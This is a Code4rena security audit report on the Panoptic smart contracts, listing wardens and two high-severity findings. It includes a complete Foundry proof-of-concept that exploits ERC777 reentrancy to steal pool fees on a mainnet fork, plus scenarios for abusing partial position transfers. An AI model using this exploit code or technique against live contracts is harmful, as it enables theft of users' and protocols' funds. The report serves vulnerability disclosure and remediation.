---
sponsor: "Panoptic"
slug: "2023-11-panoptic"
date: "2024-06-24"
title: "Panoptic"
findings: "https://github.com/code-423n4/2023-11-panoptic-findings/issues"
contest: 309
---

# Overview

## About C4

Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.

A C4 audit is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.

During the audit outlined in this document, C4 conducted an analysis of the Panoptic smart contract system written in Solidity. The audit took place between November 27 — December 11, 2023.

## Wardens

74 Wardens contributed reports to Panoptic:

  1. [hash](https://code4rena.com/@hash)
  2. [0xDING99YA](https://code4rena.com/@0xDING99YA)
  3. [monrel](https://code4rena.com/@monrel)
  4. [linmiaomiao](https://code4rena.com/@linmiaomiao)
  5. [bin2chen](https://code4rena.com/@bin2chen)
  6. [tapir](https://code4rena.com/@tapir)
  7. [fnanni](https://code4rena.com/@fnanni)
  8. [minhtrng](https://code4rena.com/@minhtrng)
  9. [sivanesh\_808](https://code4rena.com/@sivanesh_808)
  10. [LokiThe5th](https://code4rena.com/@LokiThe5th)
  11. [osmanozdemir1](https://code4rena.com/@osmanozdemir1)
  12. [SpicyMeatball](https://code4rena.com/@SpicyMeatball)
  13. [lil\_eth](https://code4rena.com/@lil_eth)
  14. [kfx](https://code4rena.com/@kfx)
  15. [ether\_sky](https://code4rena.com/@ether_sky)
  16. [KupiaSec](https://code4rena.com/@KupiaSec)
  17. [0xloscar01](https://code4rena.com/@0xloscar01)
  18. [Sathish9098](https://code4rena.com/@Sathish9098)
  19. [0xCiphky](https://code4rena.com/@0xCiphky)
  20. [0xSmartContract](https://code4rena.com/@0xSmartContract)
  21. [catellatech](https://code4rena.com/@catellatech)
  22. [0xHelium](https://code4rena.com/@0xHelium)
  23. [critical-or-high](https://code4rena.com/@critical-or-high)
  24. [0xAnah](https://code4rena.com/@0xAnah)
  25. [JCK](https://code4rena.com/@JCK)
  26. [Udsen](https://code4rena.com/@Udsen)
  27. [ptsanev](https://code4rena.com/@ptsanev)
  28. [Cryptor](https://code4rena.com/@Cryptor)
  29. [lanrebayode77](https://code4rena.com/@lanrebayode77)
  30. [Topmark](https://code4rena.com/@Topmark)
  31. [Neon2835](https://code4rena.com/@Neon2835)
  32. [K42](https://code4rena.com/@K42)
  33. [ZanyBonzy](https://code4rena.com/@ZanyBonzy)
  34. [foxb868](https://code4rena.com/@foxb868)
  35. [Bulletprime](https://code4rena.com/@Bulletprime)
  36. [0xAadi](https://code4rena.com/@0xAadi)
  37. [tala7985](https://code4rena.com/@tala7985)
  38. [Raihan](https://code4rena.com/@Raihan)
  39. [fouzantanveer](https://code4rena.com/@fouzantanveer)
  40. [SY\_S](https://code4rena.com/@SY_S)
  41. [0xhex](https://code4rena.com/@0xhex)
  42. [alix40](https://code4rena.com/@alix40)
  43. [0xta](https://code4rena.com/@0xta)
  44. [unique](https://code4rena.com/@unique)
  45. [naman1778](https://code4rena.com/@naman1778)
  46. [SAQ](https://code4rena.com/@SAQ)
  47. [0x886699](https://code4rena.com/@0x886699)
  48. [arjun16](https://code4rena.com/@arjun16)
  49. [Eurovickk](https://code4rena.com/@Eurovickk)
  50. [0x6980](https://code4rena.com/@0x6980)
  51. [nisedo](https://code4rena.com/@nisedo)
  52. [nocoder](https://code4rena.com/@nocoder)
  53. [hubble](https://code4rena.com/@hubble) ([ksk2345](https://code4rena.com/@ksk2345) and [shri4net](https://code4rena.com/@shri4net))
  54. [ro1sharkm](https://code4rena.com/@ro1sharkm)
  55. [baice](https://code4rena.com/@baice)
  56. [ThenPuli](https://code4rena.com/@ThenPuli)
  57. [Audinarey](https://code4rena.com/@Audinarey)
  58. [Banditx0x](https://code4rena.com/@Banditx0x)
  59. [Skylice](https://code4rena.com/@Skylice)
  60. [hunter\_w3b](https://code4rena.com/@hunter_w3b)
  61. [seaton0x1](https://code4rena.com/@seaton0x1)
  62. [leegh](https://code4rena.com/@leegh)
  63. [CRYP70](https://code4rena.com/@CRYP70)
  64. [D1r3Wolf](https://code4rena.com/@D1r3Wolf)
  65. [onchain-guardians](https://code4rena.com/@onchain-guardians) ([Viraz](https://code4rena.com/@Viraz) and [0xepley](https://code4rena.com/@0xepley))
  66. [grearlake](https://code4rena.com/@grearlake)
  67. [ustas](https://code4rena.com/@ustas)
  68. [lsaudit](https://code4rena.com/@lsaudit)
  69. [hihen](https://code4rena.com/@hihen)
  70. [t4sk](https://code4rena.com/@t4sk)
  71. [tpiliposian](https://code4rena.com/@tpiliposian)
  72. [fatherOfBlocks](https://code4rena.com/@fatherOfBlocks)

This audit was judged by [Picodes](https://code4rena.com/@Picodes).

Final report assembled by [thebrittfactor](https://twitter.com/brittfactorC4).

# Summary

The C4 analysis yielded an aggregated total of 7 unique vulnerabilities. Of these vulnerabilities, 2 received a risk rating in the category of HIGH severity and 5 received a risk rating in the category of MEDIUM severity.

Additionally, C4 analysis included 37 reports detailing issues with a risk rating of LOW severity or non-critical. There were also 18 reports recommending gas optimizations.

All of the issues presented here are linked back to their original finding.

# Scope

The code under review can be found within the [C4 Panoptic repository](https://github.com/code-423n4/2023-11-panoptic), and is composed of 13 smart contracts written in the Solidity programming language and includes 1676 lines of Solidity code.

In addition to the known issues identified by the project team, a Code4rena bot race was conducted at the start of the audit. The winning bot, **IllIllI-bot** from warden IllIllI, generated the [Automated Findings report](https://gist.github.com/code423n4/7dcb6a2255ec949b54664c8c8c12b879) and all findings therein were classified as out of scope.

# Severity Criteria

C4 assesses the severity of disclosed vulnerabilities based on three primary risk categories: high, medium, and low/non-critical.

High-level considerations for vulnerabilities span the following key areas when conducting assessments:

- Malicious Input Handling
- Escalation of privileges
- Arithmetic
- Gas use

For more information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on [the C4 website](https://code4rena.com), specifically our section on [Severity Categorization](https://docs.code4rena.com/awarding/judging-criteria/severity-categorization).

# High Risk Findings (2)
## [[H-01] Attacker can steal all fees from SFPM in pools with ERC777 tokens](https://github.com/code-423n4/2023-11-panoptic-findings/issues/448)
*Submitted by [monrel](https://github.com/code-423n4/2023-11-panoptic-findings/issues/448), also found by [hash](https://github.com/code-423n4/2023-11-panoptic-findings/issues/519), [linmiaomiao](https://github.com/code-423n4/2023-11-panoptic-findings/issues/500), and [bin2chen](https://github.com/code-423n4/2023-11-panoptic-findings/issues/196)*

An attacker can steal all outstanding fees belonging to the SFPM in a uniswap pool if a token in the pool is an ERC777.

### Proof of Concept

The attack is possible due to the following sequence of events when minting a short option with `minTokenizedPosition()`:

1.  ERC1155 is minted. [L521](https://github.com/code-423n4/2023-11-panoptic/blob/aa86461c9d6e60ef75ed5a1fe36a748b952c8666/contracts/SemiFungiblePositionManager.sol#L521)

```solidity
_mint(msg.sender, tokenId, positionSize);
```

2.  Liquidity is updated. [L1004](https://github.com/code-423n4/2023-11-panoptic/blob/aa86461c9d6e60ef75ed5a1fe36a748b952c8666/contracts/SemiFungiblePositionManager.sol#L1004-L1006)

```solidity
            s_accountLiquidity[positionKey] = uint256(0).toLeftSlot(removedLiquidity).toRightSlot(
```

3.  An LP position is minted and tokens are transferred from `msg.sender` to uniswap. [L1031](https://github.com/code-423n4/2023-11-panoptic/blob/aa86461c9d6e60ef75ed5a1fe36a748b952c8666/contracts/SemiFungiblePositionManager.sol#L1031-L1033)

```solidity
            _moved = isLong == 0
                ? _mintLiquidity(_liquidityChunk, _univ3pool) 
                : _burnLiquidity(_liquidityChunk, _univ3pool); 
```

4.  `feesBase` is updated. [L1062](https://github.com/code-423n4/2023-11-panoptic/blob/aa86461c9d6e60ef75ed5a1fe36a748b952c8666/contracts/SemiFungiblePositionManager.sol#L1062-L1066)

```solidity
s_accountFeesBase[positionKey] = _getFeesBase(
            _univ3pool,
            updatedLiquidity,
            _liquidityChunk
        );
```

If at least one of the tokens transferred at step 3 is an ERC777 `msg.sender` can implement a `tokensToSender()` hook and transfer the ERC1155 before `s_accountFeesBase[positionKey]` has been updated. `registerTokenTransfer()` will copy  `s_accountLiquidity[positionKey]>0` and `s_accountFeesBase[positionKey] = 0` such that the receiver now has a ERC1155 position with non-zero liquidity but a `feesBase = 0`.

When this position is burned the fees collected are calculated based on: [L1209](https://github.com/code-423n4/2023-11-panoptic/blob/aa86461c9d6e60ef75ed5a1fe36a748b952c8666/contracts/SemiFungiblePositionManager.sol#L1209-L1211)

```solidity
int256 amountToCollect = _getFeesBase(univ3pool, startingLiquidity, liquidityChunk).sub(s_accountFeesBase[positionKey]
```

The attacker will withdraw fees based on the current value of `feeGrowthInside0LastX128` and `feeGrowthInside1LastX128` and not the difference between the current values and when the short position was created.

The attacker can chose the tick range such that `feeGrowthInside1LastX128` and `feeGrowthInside1LastX128` are as large as possible to minimize the liquidity needed steal all available fees.

The `AttackImp` contract below implements the `tokensToSend()` hook and transfer the ERC1155 before `feesBase` has been set.  An address `Attacker` deploys `AttackImp` and calls `AttackImp#minAndTransfer()` to start the attack. To finalize the attack they burn the position and steal all available fees that belong to the SFPM.

In the POC we use the VRA pool as an example of a uniswap pool with a ERC777 token.

Create a test file in `2023-11-panoptic/test/foundry/core/Attacker.t.sol` and paste the below code. Run `forge test --match-test testAttack --fork-url "https://eth.public-rpc.com" --fork-block-number 18755776 -vvv` to execute the POC.

<details>

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {stdMath} from "forge-std/StdMath.sol";
import {Errors} from "@libraries/Errors.sol";
import {Math} from "@libraries/Math.sol";
import {PanopticMath} from "@libraries/PanopticMath.sol";
import {CallbackLib} from "@libraries/CallbackLib.sol";
import {TokenId} from "@types/TokenId.sol";
import {LeftRight} from "@types/LeftRight.sol";
import {IERC20Partial} from "@testUtils/IERC20Partial.sol";
import {TickMath} from "v3-core/libraries/TickMath.sol";
import {FullMath} from "v3-core/libraries/FullMath.sol";
import {FixedPoint128} from "v3-core/libraries/FixedPoint128.sol";
import {IUniswapV3Pool} from "v3-core/interfaces/IUniswapV3Pool.sol";
import {IUniswapV3Factory} from "v3-core/interfaces/IUniswapV3Factory.sol";
import {LiquidityAmounts} from "v3-periphery/libraries/LiquidityAmounts.sol";
import {SqrtPriceMath} from "v3-core/libraries/SqrtPriceMath.sol";
import {PoolAddress} from "v3-periphery/libraries/PoolAddress.sol";
import {PositionKey} from "v3-periphery/libraries/PositionKey.sol";
import {ISwapRouter} from "v3-periphery/interfaces/ISwapRouter.sol";
import {SemiFungiblePositionManager} from "@contracts/SemiFungiblePositionManager.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {PositionUtils} from "../testUtils/PositionUtils.sol";
import {UniPoolPriceMock} from "../testUtils/PriceMocks.sol";
import {ReenterMint, ReenterBurn} from "../testUtils/ReentrancyMocks.sol";

import {ERC1820Implementer} from "openzeppelin-contracts/contracts/utils/introspection/ERC1820Implementer.sol";
import {IERC1820Registry} from "openzeppelin-contracts/contracts/utils/introspection/IERC1820Registry.sol";
import {ERC1155Receiver} from  "openzeppelin-contracts/contracts/token/ERC1155/utils/ERC1155Receiver.sol";

import "forge-std/console2.sol";

contract SemiFungiblePositionManagerHarness is SemiFungiblePositionManager {
    constructor(IUniswapV3Factory _factory) SemiFungiblePositionManager(_factory) {}

    function poolContext(uint64 poolId) public view returns (PoolAddressAndLock memory) {
        return s_poolContext[poolId];
    }

    function addrToPoolId(address pool) public view returns (uint256) {
        return s_AddrToPoolIdData[pool];
    }
}

contract AttackImp is ERC1820Implementer{
    
    bytes32 constant private TOKENS_SENDER_INTERFACE_HASH =
        0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895;
        
    IERC1820Registry _ERC1820_REGISTRY = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);


    SemiFungiblePositionManagerHarness sfpm;
    ISwapRouter router = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);

    address token0;
    address token1;
    uint256 tokenId;
    uint128 positionSize;
    address owner;

    constructor(address _token0, address _token1, address _sfpm) {    
        owner = msg.sender;
        sfpm = SemiFungiblePositionManagerHarness(_sfpm);
        token0 = _token0;
        token1 = _token1;

        IERC20Partial(token0).approve(address(sfpm), type(uint256).max);
        IERC20Partial(token1).approve(address(sfpm), type(uint256).max);

        IERC20Partial(token0).approve(address(router), type(uint256).max);
        IERC20Partial(token1).approve(address(router), type(uint256).max);

        _registerInterfaceForAddress(
            TOKENS_SENDER_INTERFACE_HASH,
            address(this)
        );
        
        IERC1820Registry(_ERC1820_REGISTRY).setInterfaceImplementer(
            address(this), 
            TOKENS_SENDER_INTERFACE_HASH,
            address(this)
        );

    }
    
    function onERC1155Received(address _operator, address _from, uint256 _id, uint256 _value, bytes calldata _data) external returns(bytes4){
        return bytes4(keccak256("onERC1155Received(address,address,uint256,uint256,bytes)"));
    }
        
    function mintAndTransfer(
        uint256 _tokenId,
        uint128 _positionSize,
        int24 slippageTickLimitLow, 
        int24 slippageTickLimitHigh
        ) public
    {
        tokenId = _tokenId;
        positionSize = _positionSize;

        sfpm.mintTokenizedPosition(
        tokenId,
        positionSize,
        slippageTickLimitLow, 
        slippageTickLimitHigh
        );
    }

    function tokensToSend(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external {
        sfpm.safeTransferFrom(address(this), owner, tokenId, positionSize, bytes(""));

    }

}

contract stealFees is Test {
    using TokenId for uint256;
    using LeftRight for int256;
    using LeftRight for uint256;

    address VRA = 0xF411903cbC70a74d22900a5DE66A2dda66507255;
    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    IUniswapV3Pool POOL = IUniswapV3Pool(0x98409d8CA9629FBE01Ab1b914EbF304175e384C8);
    IUniswapV3Factory V3FACTORY = IUniswapV3Factory(0x1F98431c8aD98523631AE4a59f267346ea31F984);
    ISwapRouter router = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);

    SemiFungiblePositionManagerHarness sfpm;

    IUniswapV3Pool pool;
    uint64 poolId;
    address token0;
    address token1;
    uint24 fee;
    int24 tickSpacing;
    uint256 isWETH; 

    int24 currentTick;
    uint160 currentSqrtPriceX96;
    uint256 feeGrowthGlobal0X128;
    uint256 feeGrowthGlobal1X128;
    
    address Attacker = address(0x12356838383);
    address Merlin = address(0x12349931);
    address Swapper = address(0x019399312349931);
    
    //Width and strike is set such that at least one tick is already initialized
    int24 width = 60;
    int24 strike = 125160+60; 

    uint256 tokenId;
    AttackImp Implementer; 
    
    int24 tickLower;
    int24 tickUpper;

    uint128 positionSize;
    uint128 positionSizeBurn;


    function setUp() public {
        sfpm = new SemiFungiblePositionManagerHarness(V3FACTORY);
    }

    function _initPool(uint256 seed) internal {
        _cacheWorldState(POOL);
        sfpm.initializeAMMPool(token0, token1, fee);
    }

    function _cacheWorldState(IUniswapV3Pool _pool) internal {
        pool = _pool;
        poolId = PanopticMath.getPoolId(address(_pool));
        token0 = _pool.token0();
        token1 = _pool.token1();
        isWETH = token0 == address(WETH) ? 0 : 1;
        fee = _pool.fee();
        tickSpacing = _pool.tickSpacing();
        (currentSqrtPriceX96, currentTick, , , , , ) = _pool.slot0();
        feeGrowthGlobal0X128 = _pool.feeGrowthGlobal0X128();
        feeGrowthGlobal1X128 = _pool.feeGrowthGlobal1X128();
    }

    function addUniv3pool(uint256 self, uint64 _poolId) internal pure returns (uint256) {
        unchecked {
            return self + uint256(_poolId);
        }
    }

    function generateFees(uint256 run) internal {
        for (uint256 x; x < run; x++) {

        }
    }

    function testAttack() public {
            
        _initPool(1);
        positionSize = 1e18;

        tokenId = uint256(0).addUniv3pool(poolId).addLeg(
            0,
            1,
            isWETH,
            0,
            0,
            0,
            strike,
            width
        );

        (tickLower, tickUpper) = tokenId.asTicks(0, tickSpacing);


        //------------ Honest user mints short position ------------------------------

        vm.startPrank(Merlin); 

        deal(token0, Merlin, type(uint128).max);
        deal(token1, Merlin, type(uint128).max);

        IERC20Partial(token0).approve(address(sfpm), type(uint256).max);
        IERC20Partial(token1).approve(address(sfpm), type(uint256).max);

        IERC20Partial(token0).approve(address(router), type(uint256).max);
        IERC20Partial(token1).approve(address(router), type(uint256).max);

        (int256 totalCollected, int256 totalSwapped, int24 newTick ) = sfpm.mintTokenizedPosition(
            tokenId,
            uint128(positionSize),
            TickMath.MIN_TICK,
            TickMath.MAX_TICK
        );

        (uint128 premBeforeSwap0, uint128 premBeforeSwap1) = sfpm.getAccountPremium(
                address(pool),
                Merlin,
                0,
                tickLower,
                tickUpper,
                currentTick,
                0
        );

        uint256 accountLiqM = sfpm.getAccountLiquidity(
            address(POOL),
            Merlin,
            0,
            tickLower,
            tickUpper
        );


        console2.log("Premium in token0 belonging to Merlin before swaps:   ", Math.mulDiv64(premBeforeSwap0, accountLiqM.rightSlot()));
        console2.log("Premium in token1 belonging to Merlin before swaps:   ", Math.mulDiv64(premBeforeSwap1, accountLiqM.rightSlot()));

        //------------ Swap in pool to generate fees -----------------------------

        changePrank(Swapper);

        deal(token0, Swapper, type(uint128).max);
        deal(token1, Swapper, type(uint128).max);

        IERC20Partial(token0).approve(address(router), type(uint256).max);
        IERC20Partial(token1).approve(address(router), type(uint256).max);
        
        uint256 swapSize = 10e18;

        router.exactInputSingle(
            ISwapRouter.ExactInputSingleParams(
                isWETH == 0 ? token0 : token1,
                isWETH == 1 ? token0 : token1,
                fee,
                Swapper,
                block.timestamp,
                swapSize,
                0,
                0
            )
        );

        router.exactOutputSingle(
            ISwapRouter.ExactOutputSingleParams(
                isWETH == 1 ? token0 : token1,
                isWETH == 0 ? token0 : token1,
                fee,
                Swapper,
                block.timestamp,
                swapSize - (swapSize * fee) / 1_000_000,
                type(uint256).max,
                0
            )
        );

        (, currentTick, , , , , ) = pool.slot0();

        // poke uniswap pool
        changePrank(address(sfpm));
        pool.burn(tickLower, tickUpper, 0);

        (uint128 premAfterSwap0, uint128 premAfterSwap1) = sfpm.getAccountPremium(
                address(pool),
                Merlin,
                0,
                tickLower,
                tickUpper,
                currentTick,
                0
        );


        console2.log("Premium in token0 belonging to Merlin after swaps:    ", Math.mulDiv64(premAfterSwap0, accountLiqM.rightSlot()));
        console2.log("Premium in token1 belonging to Merling after swaps:   ", Math.mulDiv64(premAfterSwap1, accountLiqM.rightSlot()));


        // -------------- Attack is performed  -------------------------------
        
        
        changePrank(Attacker); 

        Implementer = new AttackImp(token0, token1, address(sfpm)); 

        deal(token0, address(Implementer), type(uint128).max);
        deal(token1, address(Implementer), type(uint128).max);

        Implementer.mintAndTransfer(
            tokenId,
            uint128(positionSize),
            TickMath.MIN_TICK,
            TickMath.MAX_TICK
        );

        
        uint256 balance = sfpm.balanceOf(Attacker, tokenId);
        uint256 balance2 = sfpm.balanceOf(Merlin, tokenId);

        
        (uint128 premTokenAttacker0, uint128 premTokenAttacker1) = sfpm.getAccountPremium(
                address(pool),
                Merlin,
                0,
                tickLower,
                tickUpper,
                currentTick,
                0
        );

        (, , , uint256 tokensowed0, uint256 tokensowed1) = pool.positions(
            PositionKey.compute(address(sfpm), tickLower, tickUpper)
        );
         
        console2.log("Fees in token0 available to SFPM before attack:       ", tokensowed0);
        console2.log("Fees in token1 available to SFPM before attack:       ", tokensowed1);
        
        
        sfpm.burnTokenizedPosition(
            tokenId,
            uint128(positionSize),
            TickMath.MIN_TICK,
            TickMath.MAX_TICK
        );
                
        (, , , tokensowed0, tokensowed1) = pool.positions(
            PositionKey.compute(address(sfpm), tickLower, tickUpper)
        );
         
        console2.log("Fees in token0 available to SFPM after attack:        ", tokensowed0);
        console2.log("Fees in token1 available to SFPM after attack:        ", tokensowed1);

        {
            // Tokens used for attack, deposited through implementer
            uint256 attackerDeposit0 = type(uint128).max - IERC20(token0).balanceOf(address(Implementer)); 
            uint256 attackerDeposit1 = type(uint128).max - IERC20(token1).balanceOf(address(Implementer));
            
            uint256 attackerProfit0 =IERC20(token0).balanceOf(Attacker)-attackerDeposit0;
            uint256 attackerProfit1 =IERC20(token1).balanceOf(Attacker)-attackerDeposit1;

            console2.log("Attacker Profit in token0:                            ", attackerProfit0);
            console2.log("Attacker Profit in token1:                            ", attackerProfit1); 
            
            assertGe(attackerProfit0+attackerProfit1,0);
        }        
    }
} 
```

</details>

### Tools Used

VScode, Foundry

### Recommended Mitigation Steps

Update liquidity after minting/burning:

```solidity
            _moved = isLong == 0
                ? _mintLiquidity(_liquidityChunk, _univ3pool) 
                : _burnLiquidity(_liquidityChunk, _univ3pool); 

            s_accountLiquidity[positionKey] = uint256(0).toLeftSlot(removedLiquidity).toRightSlot(
                updatedLiquidity 
            );
```

For redundancy, `registerTokensTransfer()` can also use the `ReentrancyLock()` modifier to always block reentrancy when minting and burning.

### Assessed type

Reentrancy

**[dyedm1 (Panoptic) confirmed via duplicate issue #519](https://github.com/code-423n4/2023-11-panoptic-findings/issues/519#issuecomment-1859619308)**

***

## [[H-02] Partial transfers are still possible, leading to incorrect storage updates, and the calculated account premiums will be significantly different from what they should be](https://github.com/code-423n4/2023-11-panoptic-findings/issues/256)
*Submitted by [osmanozdemir1](https://github.com/code-423n4/2023-11-panoptic-findings/issues/256), also found by minhtrng ([1](https://github.com/code-423n4/2023-11-panoptic-findings/issues/615), [2](https://github.com/code-423n4/2023-11-panoptic-findings/issues/613)), fnanni ([1](https://github.com/code-423n4/2023-11-panoptic-findings/issues/498), [2](https://github.com/code-423n4/2023-11-panoptic-findings/issues/489)), [0xloscar01](https://github.com/code-423n4/2023-11-panoptic-findings/issues/356), [KupiaSec](https://github.com/code-423n4/2023-11-panoptic-findings/issues/282), [ether\_sky](https://github.com/code-423n4/2023-11-panoptic-findings/issues/206), [hash](https://github.com/code-423n4/2023-11-panoptic-findings/issues/527), [0xDING99YA](https://github.com/code-423n4/2023-11-panoptic-findings/issues/341), and [SpicyMeatball](https://github.com/code-423n4/2023-11-panoptic-findings/issues/324)*

The positions in this protocol are ERC1155 tokens and they can be minted or burned.

Token transfers are [extremely limited](https://github.com/code-423n4/2023-11-panoptic/blob/f75d07c345fd795f907385868c39bafcd6a56624/contracts/SemiFungiblePositionManager.sol#L573) in the protocol:

- The sender must transfer all of its liquidity.

- The recipient must not have a position in that tick range and token type.

Users' current liquidity in their positions is tracked with a storage variable called [`s_accountLiquidity`](https://github.com/code-423n4/2023-11-panoptic/blob/f75d07c345fd795f907385868c39bafcd6a56624/contracts/SemiFungiblePositionManager.sol#L179). This mapping [is overwritten during transfers and the whole value is transferred](https://github.com/code-423n4/2023-11-panoptic/blob/f75d07c345fd795f907385868c39bafcd6a56624/contracts/SemiFungiblePositionManager.sol#L625C13-L627C54). The reason for not allowing partial transfers is that partial transfers will mess up the whole storage updating mechanism.

The requirements mentioned above are checked [here](https://github.com/code-423n4/2023-11-panoptic/blob/f75d07c345fd795f907385868c39bafcd6a56624/contracts/SemiFungiblePositionManager.sol#L613C13-L621C99):

```solidity
file: SemiFungiblePositionManager.sol
// function registerTokenTransfer
            // ...

            // Revert if recipient already has that position
            if (
                (s_accountLiquidity[positionKey_to] != 0) ||
                (s_accountFeesBase[positionKey_to] != 0)
            ) revert Errors.TransferFailed();

            // Revert if not all balance is transferred
            uint256 fromLiq = s_accountLiquidity[positionKey_from];
-->         if (fromLiq.rightSlot() != liquidityChunk.liquidity()) revert Errors.TransferFailed(); //@audit if the right slot is equal to transferred liquidity, it will pass. There is no check related to left slot.
        
            // ... more code
```

The check related to whether all balance is transferred or not is made by checking the right slot of the sender's liquidity using `fromLiq.rightSlot()`. Right now, I want to point out there is no check related to the left slot. I'll get there later.

Now, we have to understand how position keys are constructed, and how the left slot and right slot work. Let's start with the position [keys](https://github.com/code-423n4/2023-11-panoptic/blob/f75d07c345fd795f907385868c39bafcd6a56624/contracts/SemiFungiblePositionManager.sol#L593C13-L601C18):

```solidity
            //construct the positionKey for the from and to addresses
            bytes32 positionKey_from = keccak256(
                abi.encodePacked(
                    address(univ3pool),
                    from,
                    id.tokenType(leg),
                    liquidityChunk.tickLower(),
                    liquidityChunk.tickUpper()
                )
```

They are constructed with pool address, user address, token type, lower tick and upper tick. The most important thing I want to mention here is that whether the position is **long or short is not in the position key**. The thing that matters is the [token type (put or call)](https://github.com/code-423n4/2023-11-panoptic/blob/f75d07c345fd795f907385868c39bafcd6a56624/contracts/types/TokenId.sol#L26). Which means:

**Short put** and **Long put** orders have the same position key (*for the same tick range*) but different token IDs.

The second thing we need to know is the [left and right slot mechanism](https://github.com/code-423n4/2023-11-panoptic/blob/f75d07c345fd795f907385868c39bafcd6a56624/contracts/SemiFungiblePositionManager.sol#L170C3-L178C143):

```solidity
    /*       removed liquidity r          net liquidity N=(T-R)
     * |<------- 128 bits ------->|<------- 128 bits ------->|
     * |<---------------------- 256 bits ------------------->|
     */
    ///
    /// @dev mapping that stores the liquidity data of keccak256(abi.encodePacked(address poolAddress, address owner, int24 tickLower, int24 tickUpper))
    // liquidityData is a LeftRight. The right slot represents the liquidity currently sold (added) in the AMM owned by the user
    // the left slot represents the amount of liquidity currently bought (removed) that has been removed from the AMM - the user owes it to a seller
    // the reason why it is called "removedLiquidity" is because long options are created by removed liquidity -ie. short selling LP positions 
```

The left slot holds the removed liquidity values and the right slot holds the net liquidity values.

These values are updated in the [`_createLegInAMM`](https://github.com/code-423n4/2023-11-panoptic/blob/f75d07c345fd795f907385868c39bafcd6a56624/contracts/SemiFungiblePositionManager.sol#L936) during minting and burning depending on whether the action is [short or long or mint or burn etc.](https://github.com/code-423n4/2023-11-panoptic/blob/f75d07c345fd795f907385868c39bafcd6a56624/contracts/SemiFungiblePositionManager.sol#L971C13-L1000C18)

As I mentioned above, only the [right slot](https://github.com/code-423n4/2023-11-panoptic/blob/f75d07c345fd795f907385868c39bafcd6a56624/contracts/SemiFungiblePositionManager.sol#L621) is checked during transfers. If a user mints a short put (deposits tokens), and then mints a long put (withdraws tokens) in the same ticks, the right slot will be a very small number but the user will have two different ERC1155 tokens *(token Ids are different for short and long positions, but position key is the same)*. Then that user can transfer just the partial amount of short put tokens that correspond to the right slot.

I'll provide two different scenarios here where the sender is malicious in one of them, and a naive user in another one. You can also find a coded PoC below that shows all of these scenarios.

**Scenario 1: Alice(sender) is a malicious user**

1. Alice mints 100 **Short put** tokens.

    ```solidity
    //NOTE: The liquidity is different than the token amounts but I'm sharing like this just to make easy
    /* 
       |---left slot: removed liq---|---right slot: added liq---|
       |           0                |            100            | 
    ```

2. Alice mints 90 **Long put** tokens in the same ticks (not burn).

    ```solidity
    /* 
       |---left slot: removed liq---|---right slot: added liq---|
       |           90               |             10            | 
    ```

3. At this moment Alice has 100 short put tokens and 90 long put tokens (`tokenId`s are different but the `position key` is the same).

4. Alice transfers only 10 short put tokens to Bob. This transaction succeeds as the 10 short put token liquidity is the same as Alice's right slot liquidity. (*The net liquidity is totally transferred*).

5. After the transfer, Alice still has 90 short put tokens and 90 long put tokens but Alice's `s_accountLiquidity` storage variable is updated to 0.

6. At this moment Bob only has 10 short put tokens. However, the storage is updated. Bob didn't remove any tokens but his `s_accountLiquidity` left slot is 90, and it looks like Bob has removed 90 tokens.
    ```solidity
    /* 
       |---left slot: removed liq---|---right slot: added liq---|
       |           90               |             10            | 
    ```

There are two big problems here:

- Bob has no way to update his `removedLiquidity` variable other than burning long put tokens. However, he doesn't have these tokens. They are still in Alice's wallet.

- All of Bob's account premiums and owed premiums are calculated based on the ratio of removed, net and total liquidity. All of his account premiums for that option will be completely incorrect. See [here](https://github.com/code-423n4/2023-11-panoptic/blob/f75d07c345fd795f907385868c39bafcd6a56624/contracts/SemiFungiblePositionManager.sol#L1279C17-L1306C14).

Now imagine a malicious user minting a huge amount of short put (deposit), minting 99% of that amount of long put (withdraw), and transferring that 1% to the victim. It's basically setting traps for the victim by transferring tiny amount of **net** liquidities. The victim's account looks like he removed a lot of liquidity, and if the victim mints positions in the same range in the future, the `owed premiums` for this position will be extremely different, and much higher than it should be.

**Scenario 2: Alice (sender) is a naive user**

The initial steps are the same as those above. Alice is just a regular user.

1. Alice mints 100 short put

2. Then mints 90 long put.

3. Alice knows she has some liquidity left and transfers 10 short put tokens to her friend.

4. Right now, Alice has 90 short put tokens and 90 long put tokens. Her account liquidity is overwritten and updated to 0, but she doesn't know that. She is just a regular user. From her perspective, she still has these 90 short put and 90 long put tokens in her wallet.

5. Alice wants to burn her tokens (she has to burn the long ones first).

6. Alice burns 90 long put tokens.

[SemiFungiblePositionManager.sol#L961C9-L980C18](https://github.com/code-423n4/2023-11-panoptic/blob/f75d07c345fd795f907385868c39bafcd6a56624/contracts/SemiFungiblePositionManager.sol#L961C9-L980C18)

    ```solidity
        unchecked {
        //...
                uint128 startingLiquidity = currentLiquidity.rightSlot();
                uint128 removedLiquidity = currentLiquidity.leftSlot();
                uint128 chunkLiquidity = _liquidityChunk.liquidity();

                if (isLong == 0) {
                    // selling/short: so move from msg.sender *to* uniswap
                    // we're minting more liquidity in uniswap: so add the incoming liquidity chunk to the existing liquidity chunk
                    updatedLiquidity = startingLiquidity + chunkLiquidity;

                    /// @dev If the isLong flag is 0=short but the position was burnt, then this is closing a long position
                    /// @dev so the amount of short liquidity should decrease.
                    if (_isBurn) {
    979.-->            removedLiquidity -= chunkLiquidity; //@audit her removedLiquidity was 0, but this is inside the unchecked block. Now her removed liquidity is a huge number.
    ```

Alice's account liquidity storage was updated before (step 4) and `removedLiquidity` was 0. After burning her long put tokens, the new `removedLiquidity` (L979 above) will be an enormous number since it is inside the unchecked block.

7. Right now, Alice looks like she removed an unbelievably huge amount of liquidity and she messed up her account (but she didn't do anything wrong).

### Impact

- Partial transfers are still possible since the function only checks whether the net liquidity (right slot) is transferred.

